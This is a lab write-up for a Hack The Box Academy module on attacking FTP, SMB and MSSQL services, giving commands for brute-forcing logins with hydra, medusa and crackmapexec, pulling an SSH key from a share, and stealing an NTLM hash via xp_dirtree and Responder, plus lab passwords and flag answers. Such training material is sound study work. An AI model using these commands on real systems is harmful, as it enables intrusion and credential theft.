# HTB-Attacking_Common_Services
## Table of Contents
1. [FTP](#ftp)
2. [SMB](#smb)
3. [SQL](#sql)

### FTP
#### Tools
1. medusa
2. hydra
#### Challenges
1. What port is the FTP service running on?

    We can solve this by using nmap to find ftp port.

    ```bash
    sudo nmap -sV -sC 10.129.55.8 -v
    ```
    ![alt text](Assets/FTP1.png)

    The answer is 2121.

2. What username is available for the FTP server?

    Based on the nmap output, the anonymous login is allowed. So i tried to ftp anonymously.

    ```bash
    ftp 10.129.55.8 2121
    ```
    In there, we can find users.list and passwords.list. After download using `get <file name>`, we can bruteforce by using medusa.
    
    ```bash
    medusa -U users.list -P passwords.list -h 10.129.55.8 -n 2121 -M ftp
    ```
    Another way for the faster result is using `hydra`.

    ```bash
    sudo hydra -L users.list -P passwords.list -t 32 -s 2121 ftp://10.129.55.8
    ```
    Then we will get `robin:7iz4rnckjsduza7` credential. The answer is `robin`.

3. Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.

    By using the credential that we found, we can get the flag. The answer is `HTB{ATT4CK1NG_F7P_53RV1C3}`.

### SMB
#### Tools
1. impacket-psexec
2. CrackMapExec
3. enum4linux-ng
#### Challenges
1. What is the name of the shared folder with READ permissions?

    We can solve this by using `smbmap` with `-H` flag.

    ```bash
    smbmap -H 10.129.55.8
    ```
    The answer is `GGJ`.

2. What is the password for the username "jason"?

    We can bruteforce by using `crackmapexec` to get the password.

    ```bash
    crackmapexec smb 10.129.55.8 -u "jason" -p pws.list --local-auth
    ```
    The answer is `34c8zuNBo91!@28Bszh`.

3. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

    To solve this, we need `id_rsa` from GGJ shares. We can download it by using jason credential.

    ```bash
    smbmap -H 10.129.55.8 -u 'jason' -p '34c8zuNBo91!@28Bszh' --download "GGJ\id_rsa"
    ```
    Ater that, change id_rsa permission (600). Then we can ssh to there.

    ```bash
    ssh -o KexAlgorithms=diffie-hellman-group14-sha256 -o Ciphers=aes256-ctr -i id_rsa jason@10.129.203.6 -v
    ```
    The answer is `HTB{SMB_4TT4CKS_2349872359}`.

## SQL
1. responder
2. mssqlclient
### Challenges
1. What is the password for the "mssqlsvc" user?

    To solve this, first we need to setup responder to capture the hash.

    ```bash
    responder -I tun0
    ```
    Then we run mssqlcient.
    ```bash
    mssqlclient.py -p 1433 htbdbuser@10.129.163.211
    ```
    In there, we can perform this sql query to do hash stealing.
    ```bash
    EXEC master..xp_dirtree '\\10.10.14.16\share\'
    ```

    ![alt text](Assets/SQL1.png)

    The responder will capture the hash. Then we use hashcat to crack it.

    ```bash
    hashcat -m 5600 hash.txt /home/mrwhok/ctf/HTB-Academy/footprinting/rockyou.txt
    ```

    The answer is `princess1`.

2. Enumerate the "flagDB" database and submit a flag as your answer.

    We can login with mssqlclient again by using the credential we just found.

    ```bash
    mssqlclient.py -p 1433 mssqlsvc@10.129.163.211 -windows-auth
    ```
    Then we can examine the database and get the flag. Here the flow of it.

    ```bash
    SQL (WIN-02\mssqlsvc  guest@master)> SELECT name FROM sys.databases;
    name      
    -------   
    master    

    tempdb    

    model     

    msdb      

    hmaildb   

    flagDB    

    SQL (WIN-02\mssqlsvc  guest@master)> use flagDB;
    ENVCHANGE(DATABASE): Old Value: master, New Value: flagDB
    INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'flagDB'.
    SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> SELECT name FROM sys.tables;
    name      
    -------   
    tb_flag   

    SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> SELECT * FROM tb_flag;
    flagvalue                              
    ------------------------------------   
    b'HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}'   

    SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> 
    ```
    The answer is `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`.